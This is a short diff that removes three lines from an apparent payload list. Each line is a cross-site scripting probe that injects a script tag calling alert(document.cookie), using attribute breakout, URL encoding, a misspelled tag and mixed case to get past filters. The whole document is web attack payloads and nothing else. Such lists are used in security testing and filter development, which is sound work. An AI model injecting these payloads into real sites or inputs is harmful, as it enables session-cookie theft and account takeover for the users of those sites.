@@ -1,3 +1,0 @@
-%3cscriptt%3ealert(document.cookie)%3cscriptt%3e
-“><script >alert(document.cookie)</script >
-"><ScRiPt>alert(document.cookie)</ScRiPt>
